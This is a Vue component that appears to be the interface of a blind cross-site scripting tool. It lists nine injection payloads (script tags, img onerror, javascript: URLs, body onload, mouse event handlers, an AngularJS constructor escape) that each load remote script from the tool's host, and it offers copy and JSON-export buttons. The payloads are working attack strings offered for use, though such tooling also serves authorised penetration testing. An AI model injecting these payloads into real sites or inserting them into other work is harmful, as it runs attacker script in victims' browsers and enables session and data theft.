<script setup>
import { ref, computed } from 'vue';
import { useToast } from 'primevue/usetoast';

const toast = useToast();
const menu = ref(null);
const searchQuery = ref('');
const selectedCategory = ref('All');

const categories = [
  'All',
  'Basic',
  'Alert',
  'Image',
  'DOM',
  'Cookie Stealing',
  'Event Handlers',
  'Advanced'
];

var payloads = ref([
  {
    id: 1,
    category: 'Basic',
    name: 'Basic Script Tag',
    payload: '<script>import(\'//{{DOMAIN}}\')<\/script>',
    description: 'Simple script tag execution'
  },
  {
    id: 2,
    category: 'Basic',
    name: 'Script Tag with Source',
    payload: '<script src="//{{DOMAIN}}/"><\/script>',
    description: 'Loads external JavaScript file'
  },
  {
    id: 3,
    category: 'Alert',
    name: 'JavaScript Protocol',
    payload: 'javascript:import(\'//{{DOMAIN}}\')',
    description: 'JavaScript protocol in URL context'
  },
  {
    id: 4,
    category: 'Image',
    name: 'IMG Tag with JavaScript',
    payload: '<img src="x" onerror="import(\'//{{DOMAIN}}\')">',
    description: 'Executes when image fails to load'
  },
  {
    id: 5,
    category: 'DOM',
    name: 'innerHTML XSS',
    payload: '<div id="test" onclick="import(\'//{{DOMAIN}}\')">Click me</div>',
    description: 'Executes when element is clicked'
  },
  {
    id: 7,
    category: 'Event Handlers',
    name: 'onload Event',
    payload: '<body onload="import(\'//{{DOMAIN}}\')">',
    description: 'Executes when body loads'
  },
  {
    id: 8,
    category: 'Event Handlers',
    name: 'onmouseover Event',
    payload: '<div onmouseover="import(\'//{{DOMAIN}}\')">Hover over me</div>',
    description: 'Executes when mouse hovers'
  },
  {
    id: 10,
    category: 'Advanced',
    name: 'AngularJS Template Injection',
    payload: '{{constructor.constructor(\'import(\\\'//{{DOMAIN}}\\\')\')()}}',
    description: 'Exploits AngularJS template'
  },
  {
    id: 11,
    category: 'DOM',
    name: 'DOM-based XSS with eval',
    payload: 'import(\'//{{DOMAIN}}\')',
    description: 'Uses eval function'
  }
]);

// replace {{DOMAIN}} with the actual domain
payloads.value = payloads.value.map(p => ({
  ...p,
  payload: p.payload.replace(/{{DOMAIN}}/g, window.location.hostname + ":" + window.location.port)
}));

const items = ref([
  { label: 'Copy All Payloads', icon: 'pi pi-fw pi-copy', command: () => copyAllPayloads() },
  { label: 'Export as JSON', icon: 'pi pi-fw pi-download', command: () => exportAsJson() }
]);

const filteredPayloads = computed(() => {
  let result = payloads.value;

  if (selectedCategory.value !== 'All') {
    result = result.filter(p => p.category === selectedCategory.value);
  }

  if (searchQuery.value) {
    const query = searchQuery.value.toLowerCase();
    result = result.filter(p =>
      p.name.toLowerCase().includes(query) ||
      p.payload.toLowerCase().includes(query) ||
      p.description.toLowerCase().includes(query)
    );
  }

  return result;
});

function copyPayload(payload) {
  navigator.clipboard.writeText(payload)
    .then(() => {
      toast.add({ severity: 'success', summary: 'Copied!', detail: 'Payload copied to clipboard', life: 3000 });
    })
    .catch(() => {
      toast.add({ severity: 'error', summary: 'Error', detail: 'Failed to copy payload', life: 3000 });
    });
}

function copyAllPayloads() {
  const allPayloads = filteredPayloads.value.map(p => p.payload).join('\n\n');
  navigator.clipboard.writeText(allPayloads)
    .then(() => {
      toast.add({ severity: 'success', summary: 'Copied!', detail: 'All payloads copied to clipboard', life: 3000 });
    })
    .catch(() => {
      toast.add({ severity: 'error', summary: 'Error', detail: 'Failed to copy payloads', life: 3000 });
    });
}

function exportAsJson() {
  const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(filteredPayloads.value, null, 2));
  const downloadAnchorNode = document.createElement('a');
  downloadAnchorNode.setAttribute("href", dataStr);
  downloadAnchorNode.setAttribute("download", "xss_payloads.json");
  document.body.appendChild(downloadAnchorNode);
  downloadAnchorNode.click();
  downloadAnchorNode.remove();

  toast.add({ severity: 'info', summary: 'Exported!', detail: 'Payloads exported as JSON', life: 3000 });
}
</script>

<template>
  <Toast />
  <div class="card">
    <div class="flex items-center justify-between mb-6">
      <div class="font-semibold text-xl">XSS Payloads Collection</div>
      <div>
        <Button icon="pi pi-ellipsis-v" class="p-button-text p-button-plain p-button-rounded"
          @click="menu.toggle($event)" />
        <Menu ref="menu" popup :model="items" class="!min-w-40" />
      </div>
    </div>

    <div class="flex flex-column md:flex-row gap-3 mb-4">
  <div class="flex-grow-1">
    <span class="p-input-icon-left w-full relative">
      <i class="pi pi-search absolute top-1/2 right-3 transform -translate-y-1/2" />
      <InputText v-model="searchQuery" placeholder="Search payloads..." class="w-full pl-8" />
    </span>
  </div>
  <Dropdown v-model="selectedCategory" :options="categories" placeholder="Select Category" class="w-full md:w-48" />
</div>

    <div v-if="filteredPayloads.length === 0" class="text-center py-4 text-muted-color">
      No payloads match your criteria
    </div>

    <ul class="p-0 mx-0 mt-0 mb-6 list-none">
      <li v-for="payload in filteredPayloads" :key="payload.id"
        class="mb-3 border border-surface rounded-lg overflow-hidden">
        <div class="flex items-center justify-between bg-surface-50 dark:bg-surface-800 px-4 py-2">
          <div class="flex items-center">
            <Badge :value="payload.category" severity="info" class="mr-2" />
            <span class="font-medium">{{ payload.name }}</span>
          </div>
          <Button icon="pi pi-copy" class="p-button-text p-button-rounded" @click="copyPayload(payload.payload)"
            tooltip="Copy Payload" tooltipOptions="top" />
        </div>
        <div class="p-3 bg-surface-0 dark:bg-surface-900">
          <div class="font-mono text-sm p-3 bg-surface-100 dark:bg-surface-800 rounded overflow-x-auto">
            {{ payload.payload }}
          </div>
          <div class="text-sm text-surface-600 dark:text-surface-400 mt-2">
            {{ payload.description }}
          </div>
        </div>
      </li>
    </ul>
  </div>
</template>